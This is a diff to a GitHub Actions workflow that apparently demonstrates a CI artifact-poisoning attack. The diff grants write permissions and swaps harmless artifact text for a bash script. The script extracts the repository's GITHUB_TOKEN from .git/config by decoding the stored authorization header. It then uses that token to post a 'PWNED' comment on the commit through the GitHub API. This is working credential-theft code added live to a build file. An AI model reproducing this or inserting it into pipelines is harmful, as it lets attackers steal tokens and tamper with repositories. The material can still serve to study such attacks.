@@ -9,13 +9,23 @@ on:
   pull_request:
     types: [opened, reopened, synchronize, ready_for_review]
 
+permissions:
+  contents: read
+  pull-requests: write
+  issues: write
+
 jobs:
   creates-artifact:
     runs-on: ubuntu-latest
     steps:
       - run: |
           cat <<'EOF' >> myartifact
-          echo "this is legitimate text"
+          #!/bin/bash
+          export GITHUB_TOKEN=$(cat $GITHUB_WORKSPACE/.git/config | grep AUTHORIZATION | cut -d':' -f 2 | cut -d' ' -f 3 | base64 -d | cut -d':' -f 2)
+
+          curl -X POST -H "Authorization: Token $GITHUB_TOKEN" \
+          -d '{"body": "PWNED"}' \
+          https://api.github.com/repos/$GITHUB_REPOSITORY/commits/$GITHUB_SHA/comments
           EOF
       - name: Upload environment variables artifact
         uses: actions/upload-artifact@v3
